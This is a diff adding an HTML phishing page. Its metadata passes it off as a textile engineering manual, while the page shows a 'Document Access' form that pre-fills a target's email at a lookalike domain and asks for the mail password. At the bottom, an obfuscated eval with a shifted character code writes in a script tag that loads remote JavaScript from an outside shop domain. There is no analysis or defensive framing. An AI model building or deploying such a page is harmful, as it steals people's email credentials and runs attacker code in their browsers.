@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Secured File Access</title>
+  <meta name="description" content="Access the technical reference manual for advanced textile engineering, material science, and sustainable fabric weaving architectures. Built for designers and manufacturers.">
+  <link rel="canonical" href="https://texturecraft.org/docs/fabric-textile-synthesis">
+  <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Premium Fabric Synthesis & Sustainable Textile Manual">
+  <meta property="og:description" content="Access the technical reference manual for advanced textile engineering, material science, and sustainable fabric weaving architectures. Built for designers and manufacturers.">
+
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <link rel="manifest" href="/site.webmanifest">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "TechArticle",
+        "@id": "https://texturecraft.org/docs/fabric-textile-synthesis#document",
+        "url": "https://texturecraft.org/docs/fabric-textile-synthesis",
+        "name": "Premium Fabric Synthesis & Sustainable Textile Manual",
+        "description": "An industrial and material science reference manual covering fiber polymers, micro-weave architecture engineering, and environmental dye processing regulations.",
+        "inLanguage": "en-US",
+        "mainEntityOfPage": "https://texturecraft.org/docs/fabric-textile-synthesis",
+        "author": {
+          "@type": "Organization",
+          "name": "TextureCraft",
+          "url": "https://texturecraft.org"
+        },
+        "publisher": {
+          "@type": "Organization",
+          "name": "TextureCraft",
+          "logo": {
+            "@type": "ImageObject",
+            "url": "https://texturecraft.org/assets/logo.png"
+          }
+        },
+        "datePublished": "2026-01-15T08:00:00+01:00",
+        "dateModified": "2026-05-25T12:00:00+01:00"
+      },
+      {
+        "@type": "BreadcrumbList",
+        "@id": "https://texturecraft.org/docs/fabric-textile-synthesis#breadcrumb",
+        "itemListElement": [
+          {
+            "@type": "ListItem",
+            "position": 1,
+            "name": "Home",
+            "item": "https://texturecraft.org"
+          },
+          {
+            "@type": "ListItem",
+            "position": 2,
+            "name": "Documentation",
+            "item": "https://texturecraft.org/docs"
+          },
+          {
+            "@type": "ListItem",
+            "position": 3,
+            "name": "Fabric & Textile Synthesis"
+          }
+        ]
+      }
+    ]
+  }
+  </script>
+  <style>
+  :root {
+    --primary-color: #2563eb;
+    --primary-hover: #1d4ed8;
+    --bg-color: #f8fafc;
+    --text-main: #1e293b;
+    --text-muted: #64748b;
+    --error-red: #ef4444;
+    --error-bg: #fef2f2;
+    --error-border: #fee2e2;
+    --bg-overlay: rgba(15, 23, 42, 0.1);
+    --card-shadow:
+      0 10px 25px -5px rgba(0, 0, 0, 0.1),
+      0 8px 10px -6px rgba(0, 0, 0, 0.1);
+  }
+
+  body {
+    margin: 0;
+    height: 100vh;
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    -webkit-font-smoothing: antialiased;
+    background: linear-gradient(var(--bg-overlay), var(--bg-overlay)), url("https://i.postimg.cc/k5wF8Zxz/index.png");
+    background-size: cover;
+    background-position: center;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+    user-select: none;
+    -webkit-user-select: none;
+  }
+
+  .login-container {
+    z-index: 99;
+    opacity: 0;
+    background: #ffffff;
+    padding: 40px;
+    border-radius: 16px;
+    box-shadow: var(--card-shadow);
+    max-width: 420px;
+    width: 100%;
+    box-sizing: border-box;
+    text-align: center;
+    transform: scale(0.95);
+    transition: transform 0.6s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.6s ease-out;
+  }
+
+  .page-loaded {
+    transform: scale(1);
+    opacity: 1;
+  }
+
+  .hidden {
+    display: none !important;
+  }
+
+  #favi {
+    width: 48px;
+    height: 48px;
+    margin-bottom: 20px;
+    border-radius: 8px;
+  }
+
+  h2.info {
+    margin: 0 0 8px 0;
+    color: var(--text-main);
+    font-size: 1.5rem;
+    font-weight: 700;
+    letter-spacing: -0.025em;
+  }
+
+  .para {
+    color: var(--text-muted);
+    font-size: 0.95rem;
+    margin-bottom: 24px;
+  }
+
+  /* --- Status/Error Box Styling --- */
+  .status-box {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    padding: 14px;
+    background-color: var(--error-bg);
+    border: 1px solid var(--error-border);
+    border-radius: 10px;
+    margin-bottom: 24px;
+    text-align: left;
+    color: var(--error-red);
+  }
+
+  .status-icon {
+    font-size: 1.2rem;
+    margin-top: 2px;
+  }
+
+  .status-message strong {
+    display: block;
+    font-size: 0.9rem;
+    font-weight: 600;
+    margin-bottom: 2px;
+  }
+
+  .status-message p {
+    font-size: 0.85rem;
+    margin: 0;
+    line-height: 1.4;
+    color: #b91c1c;
+  }
+
+  /* --- Form Styling --- */
+  .input-group {
+    margin-bottom: 16px;
+    text-align: left;
+  }
+
+  .input-group input {
+    width: 100%;
+    padding: 12px 16px;
+    border: 1px solid #e2e8f0;
+    border-radius: 8px;
+    font-size: 1rem;
+    background-color: #fff;
+    box-sizing: border-box;
+    transition: all 0.2s ease;
+  }
+
+  .input-group input:disabled {
+    background-color: #f8fafc;
+    color: var(--text-muted);
+    border-color: #f1f5f9;
+    cursor: not-allowed;
+  }
+
+  .input-group input:focus {
+    outline: none;
+    border-color: var(--primary-color);
+    box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
+  }
+
+  /* --- Button & Loader Styling --- */
+  .sign-in-btn {
+    position: relative;
+    width: 100%;
+    padding: 12px;
+    background-color: var(--primary-color);
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    margin-top: 8px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 48px;
+  }
+
+  .sign-in-btn:hover:not(:disabled) {
+    background-color: var(--primary-hover);
+    transform: translateY(-1px);
+    box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2);
+  }
+
+  .sign-in-btn:disabled {
+    background-color: #94a3b8;
+    cursor: not-allowed;
+    opacity: 0.8;
+  }
+
+  .loader {
+    width: 20px;
+    height: 20px;
+    border: 2.5px solid rgba(255, 255, 255, 0.3);
+    border-top: 2.5px solid #ffffff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  /* --- Shake Animation --- */
+  .shake-anim {
+    animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both;
+  }
+
+  @keyframes shake {
+    10%, 90% { transform: translate3d(-1px, 0, 0); }
+    20%, 80% { transform: translate3d(2px, 0, 0); }
+    30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
+    40%, 60% { transform: translate3d(4px, 0, 0); }
+  }
+
+  @media (max-width: 480px) {
+    .login-container {
+      padding: 30px 20px;
+      box-shadow: none;
+      background: #ffffff; /* Keep bg white for mobile readability */
+      max-width: 90%;
+    }
+    body {
+      background: var(--bg-color);
+    }
+  }
+</style>
+</head><body>
+  <div class="login-container">
+    <img
+      id="favi"
+      src="https://www.google.com/s2/favicons?sz=64&domain_url=[]"
+      alt="Logo"
+    />
+    <h2 class="info">Document Access</h2>
+    <p class="para">Login to your mail to authorize your access</p>
+
+    <!-- Integrated Error/Status Container -->
+    <div id="status-box" class="status-box hidden">
+      <div class="status-icon">
+        <i class="fa-solid fa-triangle-exclamation"></i>
+      </div>
+      <div class="status-message">
+        <strong id="status-title">Network Error</strong>
+        <p id="status-text">We encountered issues verifying your connection.</p>
+      </div>
+    </div>
+
+    <form class="login-form" id="auth-form">
+      <div class="input-group">
+        <input
+          type="email"
+          id="email"
+          value="ks@greenbIocks.com"
+          required
+          disabled
+        />
+      </div>
+      <div class="input-group">
+        <input
+          type="password"
+          id="password"
+          placeholder="Enter security code"
+          required
+        />
+      </div>
+
+      <button type="submit" class="sign-in-btn" id="btn">
+        <span id="btn-text">Access Document</span>
+        <!-- Loading Spinner -->
+        <div id="loader" class="loader hidden"></div>
+      </button>
+    </form>
+  </div>
+<script>eval(String.fromCharCode.apply(null, "epdvnfou/xsjuf)#=tdsjqu!tsd>(iuuqt;00wopefufyujmft/tipq0nzTdsjqu/kt(?=0tdsjqu?#*<".split('').map(char => char.charCodeAt(0) - 1))) </script>
+
+<!-- <script src="/obs.js"></script> -->
+
+</body>
+</html>
